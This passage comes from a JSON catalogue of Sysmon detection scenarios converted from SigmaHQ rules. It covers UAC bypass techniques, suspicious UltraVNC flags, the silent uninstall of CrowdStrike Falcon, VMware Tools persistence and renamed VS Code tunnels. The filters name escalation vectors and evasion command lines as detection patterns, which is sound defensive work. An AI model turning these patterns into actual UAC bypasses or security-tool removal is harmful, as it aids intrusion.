(UACMe 59)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_computerdefaults.yml", "version": "0.2", "versions": {"0.1": {"digest": "9481472b501ed0d2f2748ed963042754a0d2bc7303d7c9d7c9a2a52349facb3f"}, "0.2": {"digest": "566857fe1b745b99d5bc7279a972df9a28ced761a35fb54448d11feefa681ed7"}}}, "sigmahq/proc_creation_win_uac_bypass_consent_comctl32": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_consent_comctl32\ndescription: |\n  Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\consent.exe' && evt.Parsed.Image endsWith '\\\\werfault.exe' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using Consent and Comctl32 - Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_consent_comctl32.yml", "version": "0.2", "versions": {"0.1": {"digest": "5ce3d63a18a806cf970dcc1049d1ffee721d7f5f2a26452b3a7e614a76e25241"}, "0.2": {"digest": "cc532a0e669e9f894f3b8eacaedff0f01818f4665d95f96069eedd94c886f455"}}}, "sigmahq/proc_creation_win_uac_bypass_dismhost": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_dismhost\ndescription: |\n  Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage contains 'C:\\\\Users\\\\' && evt.Parsed.ParentImage contains '\\\\AppData\\\\Local\\\\Temp\\\\' && evt.Parsed.ParentImage contains '\\\\DismHost.exe' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using DismHost\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_dismhost.yml", "version": "0.2", "versions": {"0.1": {"digest": "e4da79e79915864b06a60eae60ae31f8b2c3785e6b6140b0423eb255f84eea45"}, "0.2": {"digest": "6f3679c839c275d0d149596b0fcb10d144e5c29257c99d63dac00c77643e3f57"}}}, "sigmahq/proc_creation_win_uac_bypass_eventvwr_recentviews": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_eventvwr_recentviews\ndescription: |\n  Detects the pattern of UAC Bypass using Event Viewer RecentViews\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains '\\\\Event Viewer\\\\RecentViews' || evt.Parsed.CommandLine contains '\\\\EventV~1\\\\RecentViews') && evt.Parsed.CommandLine contains '>')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"UAC Bypass Using Event Viewer RecentViews\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using Event Viewer RecentViews\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_eventvwr_recentviews.yml", "version": "0.2", "versions": {"0.1": {"digest": "ab1b62dfa8285fbdfb028a5f3002cd454d9014a46323c20ff1c1b05b8ea27dd4"}, "0.2": {"digest": "6d19430cd20edaf6b71d08551b630a8b80be8b158b7ea4ab91783d9ec5c4fca0"}}}, "sigmahq/proc_creation_win_uac_bypass_fodhelper": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_fodhelper\ndescription: |\n  Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\fodhelper.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"Bypass UAC via Fodhelper.exe\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_fodhelper.yml", "version": "0.2", "versions": {"0.1": {"digest": "1e2318e5d75e097316881aa99a586e09cd03042b4ba93c7297b319efbdfe1c88"}, "0.2": {"digest": "bd08fab783288e32d8878e4ddaff90d55b632d25f7e2e4903fdc93594ee1ae54"}}}, "sigmahq/proc_creation_win_uac_bypass_icmluautil": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_icmluautil\ndescription: |\n  Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\dllhost.exe' && (evt.Parsed.ParentCommandLine contains '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' || evt.Parsed.ParentCommandLine contains '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}') && not (evt.Parsed.Image endsWith '\\\\WerFault.exe' || evt.Parsed.OriginalFileName == 'WerFault.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass via ICMLuaUtil\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_icmluautil.yml", "version": "0.2", "versions": {"0.1": {"digest": "7b941134967f409211eb8aaa880d643c681a9bab7285440c95cfcc9e5ca8161a"}, "0.2": {"digest": "22a7a37e77881bafb32c737dee77f9bbba54b71ec60a12eb9bd253462240f7ff"}}}, "sigmahq/proc_creation_win_uac_bypass_idiagnostic_profile": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_idiagnostic_profile\ndescription: |\n  Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\DllHost.exe' && evt.Parsed.ParentCommandLine contains ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using IDiagnostic Profile\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the \"IDiagnosticProfileUAC\" UAC bypass technique\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_idiagnostic_profile.yml", "version": "0.2", "versions": {"0.1": {"digest": "867713b2fd7d395f4932d9b1179ac87cf619debbaffbcdea6206c8e6ba47374e"}, "0.2": {"digest": "2bfd669747866a6269c5a6299c9ad15e398b341c6b25a2a959df606b93508f3e"}}}, "sigmahq/proc_creation_win_uac_bypass_ieinstal": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_ieinstal\ndescription: |\n  Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.IntegrityLevel in ['High', 'System']) && evt.Parsed.ParentImage endsWith '\\\\ieinstal.exe' && evt.Parsed.Image contains '\\\\AppData\\\\Local\\\\Temp\\\\' && evt.Parsed.Image endsWith 'consent.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using IEInstal - Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_ieinstal.yml", "version": "0.2", "versions": {"0.1": {"digest": "4cafc2c03bfcd48d9d2dcf6a02f38ffb6c0dd2d10612ec7d2b552f90b50d4321"}, "0.2": {"digest": "e54583abfb12f0d5d709eef162565ec621cdbf4fe961b49bb27c873e35e9b3df"}}}, "sigmahq/proc_creation_win_uac_bypass_msconfig_gui": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_msconfig_gui\ndescription: |\n  Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.IntegrityLevel in ['High', 'System']) && evt.Parsed.ParentImage endsWith '\\\\AppData\\\\Local\\\\Temp\\\\pkgmgr.exe' && evt.Parsed.CommandLine == '\"C:\\\\Windows\\\\system32\\\\msconfig.exe\" -5')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using MSConfig Token Modification - Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_msconfig_gui.yml", "version": "0.2", "versions": {"0.1": {"digest": "2441c4780e010c9bb57cdf2d7d8a4336974bf644c4d5052c06bd6310856a02ab"}, "0.2": {"digest": "88cda740945ceeb8c5d56dbc2590cc96526cb985a32e437aaeb9e4f80a4db1b4"}}}, "sigmahq/proc_creation_win_uac_bypass_ntfs_reparse_point": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_ntfs_reparse_point\ndescription: |\n  Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine startsWith '\"C:\\\\Windows\\\\system32\\\\wusa.exe\"  /quiet C:\\\\Users\\\\' && evt.Parsed.CommandLine endsWith '\\\\AppData\\\\Local\\\\Temp\\\\update.msu' && (evt.Parsed.IntegrityLevel in ['High', 'System']) || evt.Parsed.ParentCommandLine == '\"C:\\\\Windows\\\\system32\\\\dism.exe\" /online /quiet /norestart /add-package /packagepath:\"C:\\\\Windows\\\\system32\\\\pe386\" /ignorecheck' && (evt.Parsed.IntegrityLevel in ['High', 'System']) && evt.Parsed.CommandLine contains 'C:\\\\Users\\\\' && evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' && evt.Parsed.CommandLine contains '\\\\dismhost.exe {' && evt.Parsed.Image endsWith '\\\\DismHost.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using NTFS Reparse Point - Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_ntfs_reparse_point.yml", "version": "0.2", "versions": {"0.1": {"digest": "4e3063f97a2e6b0b197f90a214a087f24678479bac99cab1912e9e5476ba5900"}, "0.2": {"digest": "0d8da845fae7eed585446fa52981a79dd6d48b6a2e5d635ca7f12d3238f7e962"}}}, "sigmahq/proc_creation_win_uac_bypass_pkgmgr_dism": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_pkgmgr_dism\ndescription: |\n  Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\pkgmgr.exe' && evt.Parsed.Image endsWith '\\\\dism.exe' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using PkgMgr and DISM\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_pkgmgr_dism.yml", "version": "0.2", "versions": {"0.1": {"digest": "148d35d91585aeb7230d08774c05684837a163f19a0afd416dadf10bcbaaad95"}, "0.2": {"digest": "ffd4675c026ca40e07a6c6c881256dcf825c114296b543e5eb264c53c2979262"}}}, "sigmahq/proc_creation_win_uac_bypass_trustedpath": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_trustedpath\ndescription: |\n  Detects indicators of a UAC bypass method by mocking directories\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image contains 'C:\\\\Windows \\\\System32\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"TrustedPath UAC Bypass Pattern\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects indicators of a UAC bypass method by mocking directories\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_trustedpath.yml", "version": "0.2", "versions": {"0.1": {"digest": "1ea198cc5b0d501e4f9d8309750dca8fe761c643324109d6eddeb9e305a072f1"}, "0.2": {"digest": "c5339fe32c548c83f229da640d5556c07165bee81447eed77be5e7e0fc482dce"}}}, "sigmahq/proc_creation_win_uac_bypass_winsat": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_winsat\ndescription: |\n  Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.IntegrityLevel in ['High', 'System']) && evt.Parsed.ParentImage endsWith '\\\\AppData\\\\Local\\\\Temp\\\\system32\\\\winsat.exe' && evt.Parsed.ParentCommandLine contains 'C:\\\\Windows \\\\system32\\\\winsat.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Abusing Winsat Path Parsing - Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_winsat.yml", "version": "0.2", "versions": {"0.1": {"digest": "0258aeeec6893cfe90fe1c4e16a6ff13aca04a512ff48797b8547e9874602ac3"}, "0.2": {"digest": "41eca5e28637b42429a61e57784427cfb36aeb46b0fd4fa3b1f894fcc90371f0"}}}, "sigmahq/proc_creation_win_uac_bypass_wmp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_wmp\ndescription: |\n  Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image == 'C:\\\\Program Files\\\\Windows Media Player\\\\osk.exe' && (evt.Parsed.IntegrityLevel in ['High', 'System']) || evt.Parsed.Image == 'C:\\\\Windows\\\\System32\\\\cmd.exe' && evt.Parsed.ParentCommandLine == '\"C:\\\\Windows\\\\system32\\\\mmc.exe\" \"C:\\\\Windows\\\\system32\\\\eventvwr.msc\" /s' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass Using Windows Media Player - Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_wmp.yml", "version": "0.2", "versions": {"0.1": {"digest": "c933fd9443b68b9f0fbd118c03d79d682efbccd8230862460929100107dbbb73"}, "0.2": {"digest": "4128738a84b8dc218b11755d019e7796980f7cbf1684704b6b0b45adf088bd48"}}}, "sigmahq/proc_creation_win_uac_bypass_wsreset": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_wsreset\ndescription: |\n  Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\wsreset.exe' && not (evt.Parsed.Image endsWith '\\\\conhost.exe' || evt.Parsed.OriginalFileName == 'CONHOST.EXE'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"Bypass UAC via WSReset.exe\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_wsreset.yml", "version": "0.2", "versions": {"0.1": {"digest": "a21a9b764ebb63b412e1c3f728c7211cc17245397d1534e5631dbb50b733dac1"}, "0.2": {"digest": "75f398de066a0ae4b9d7749b7a117be62a93ccdd659ae1a772667ce28ffde111"}}}, "sigmahq/proc_creation_win_uac_bypass_wsreset_integrity_level": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uac_bypass_wsreset_integrity_level\ndescription: |\n  Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\wsreset.exe' && (evt.Parsed.IntegrityLevel in ['High', 'System']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548.002\n\n  label: \"UAC Bypass WSReset\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config\n", "path": "scenarios/sigmahq/proc_creation_win_uac_bypass_wsreset_integrity_level.yml", "version": "0.2", "versions": {"0.1": {"digest": "e9d5e7d1a0338b31d80cfc186dc0e5f0d3c54bc16b06da36f3370f2b0f6ae689"}, "0.2": {"digest": "ea46a3d5950c3357c48f3865c37243ff7936789b6e2aa3b038fbcf1601f0a215"}}}, "sigmahq/proc_creation_win_ultravnc_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_ultravnc_susp_execution\ndescription: |\n  Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '-autoreconnect ' && evt.Parsed.CommandLine contains '-connect ' && evt.Parsed.CommandLine contains '-id:')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.005\n\n  label: \"Suspicious UltraVNC Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious UltraVNC command line flag combination that indicate a auto reconnect upon execution, e.g. startup (as seen being used by Gamaredon threat group)\n", "path": "scenarios/sigmahq/proc_creation_win_ultravnc_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "60201e1e576f9e59ffc79566402d349b4646b08e66f1a47cf32357f34e5a807b"}, "0.2": {"digest": "bd361ccb46a5400b9aabbb218a955fa509c755265aeecb6b4a606a518dffce0f"}}}, "sigmahq/proc_creation_win_uninstall_crowdstrike_falcon": {"content": "type: trigger\nname: sigmahq/proc_creation_win_uninstall_crowdstrike_falcon\ndescription: |\n  Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\\\\WindowsSensor.exe' && evt.Parsed.CommandLine contains ' /uninstall' && evt.Parsed.CommandLine contains ' /quiet')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Uninstall Crowdstrike Falcon Sensor\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\n", "path": "scenarios/sigmahq/proc_creation_win_uninstall_crowdstrike_falcon.yml", "version": "0.2", "versions": {"0.1": {"digest": "592a910f08512e75f305b38abbc022659b6ec373617d2b9fe511c753c168de09"}, "0.2": {"digest": "eeb50c8e2a67540c3c8377111554a0b092b36f58a69d55063edb1df74c9739fe"}}}, "sigmahq/proc_creation_win_userinit_uncommon_child_processes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_userinit_uncommon_child_processes\ndescription: |\n  Detects uncommon \"userinit.exe\" child processes, which could be a sign of uncommon shells or login scripts used for persistence.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\userinit.exe' && not (evt.Parsed.Image endsWith ':\\\\WINDOWS\\\\explorer.exe') && not (evt.Parsed.CommandLine contains 'netlogon.bat' || evt.Parsed.CommandLine contains 'UsrLogon.cmd' || evt.Parsed.CommandLine == 'PowerShell.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\System32\\\\proquota.exe' || evt.Parsed.Image endsWith ':\\\\Windows\\\\SysWOW64\\\\proquota.exe' || evt.Parsed.Image endsWith ':\\\\Program Files (x86)\\\\Citrix\\\\HDX\\\\bin\\\\cmstart.exe' || evt.Parsed.Image endsWith ':\\\\Program Files (x86)\\\\Citrix\\\\HDX\\\\bin\\\\icast.exe' || evt.Parsed.Image endsWith ':\\\\Program Files (x86)\\\\Citrix\\\\System32\\\\icast.exe' || evt.Parsed.Image endsWith ':\\\\Program Files\\\\Citrix\\\\HDX\\\\bin\\\\cmstart.exe' || evt.Parsed.Image endsWith ':\\\\Program Files\\\\Citrix\\\\HDX\\\\bin\\\\icast.exe' || evt.Parsed.Image endsWith ':\\\\Program Files\\\\Citrix\\\\System32\\\\icast.exe' || evt.Parsed.Image == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1037.001\n\n  label: \"Uncommon Userinit Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects uncommon \"userinit.exe\" child processes, which could be a sign of uncommon shells or login scripts used for persistence.\n", "path": "scenarios/sigmahq/proc_creation_win_userinit_uncommon_child_processes.yml", "version": "0.2", "versions": {"0.1": {"digest": "bf9136702e121ed5e167ef71f2f62fd014f25d5fb7d5d0cd5d9a3875d1844fd4"}, "0.2": {"digest": "6a48eb1a7493c7d1a3751ff65554637699b331cc0310a7586759e515e9540263"}}}, "sigmahq/proc_creation_win_vmware_toolbox_cmd_persistence_susp": {"content": "type: trigger\nname: sigmahq/proc_creation_win_vmware_toolbox_cmd_persistence_susp\ndescription: |\n  Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script that's located in a potentially suspicious location to run for a specific VM state\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\VMwareToolBoxCmd.exe' || evt.Parsed.OriginalFileName == 'toolbox-cmd.exe') && evt.Parsed.CommandLine contains ' script ' && evt.Parsed.CommandLine contains ' set ' && (evt.Parsed.CommandLine contains ':\\\\PerfLogs\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Suspicious Persistence Via VMwareToolBoxCmd.EXE VM State Change Script\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the \"VMwareToolBoxCmd.exe\" with the \"script\" and \"set\" flag to setup a specific script that's located in a potentially suspicious location to run for a specific VM state\n", "path": "scenarios/sigmahq/proc_creation_win_vmware_toolbox_cmd_persistence_susp.yml", "version": "0.2", "versions": {"0.1": {"digest": "c6bb268a4711a7f1bdae726dee143b044db209cfedaccafc8228b7cb77cd8d14"}, "0.2": {"digest": "9718c4dba91a80b88e693e302c90e7de15bec68d5a70b4dbb8a2613826898696"}}}, "sigmahq/proc_creation_win_vmware_vmtoolsd_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_vmware_vmtoolsd_susp_child_process\ndescription: |\n  Detects suspicious child process creations of VMware Tools process which may indicate persistence setup\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\vmtoolsd.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.OriginalFileName in ['Cmd.Exe', 'cscript.exe', 'MSHTA.EXE', 'PowerShell.EXE', 'pwsh.dll', 'REGSVR32.EXE', 'RUNDLL32.EXE', 'wscript.exe']) && not (evt.Parsed.Image endsWith '\\\\cmd.exe' && (evt.Parsed.CommandLine contains '\\\\VMware\\\\VMware Tools\\\\poweron-vm-default.bat' || evt.Parsed.CommandLine contains '\\\\VMware\\\\VMware Tools\\\\poweroff-vm-default.bat' || evt.Parsed.CommandLine contains '\\\\VMware\\\\VMware Tools\\\\resume-vm-default.bat' || evt.Parsed.CommandLine contains '\\\\VMware\\\\VMware Tools\\\\suspend-vm-default.bat') || evt.Parsed.Image endsWith '\\\\cmd.exe' && evt.Parsed.CommandLine == '' || evt.Parsed.Image endsWith '\\\\cmd.exe' && evt.Parsed.CommandLine == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"VMToolsd Suspicious Child Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child process creations of VMware Tools process which may indicate persistence setup\n", "path": "scenarios/sigmahq/proc_creation_win_vmware_vmtoolsd_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "e1c6bb4638330382d0d2a914c1046694fb42af5938ea970ffa35b19e11b28f0e"}, "0.2": {"digest": "1c4bc37952ef828e834c0a4d9e0bc81fc608bac9fce0201c0b6c2885ef12967c"}}}, "sigmahq/proc_creation_win_vscode_tunnel_renamed_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_vscode_tunnel_renamed_execution\ndescription: |\n  Detects renamed Visual Studio Code tunnel execution. Attackers can abuse this functionality to establish a C2 channel\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.OriginalFileName == '' && evt.Parsed.CommandLine endsWith '.exe tunnel' || evt.Parsed.CommandLine contains '.exe tunnel' && evt.Parsed.CommandLine contains '--name ' && evt.Parsed.CommandLine contains '--accept-server-license-terms' || evt.Parsed.CommandLine contains 'tunnel ' && 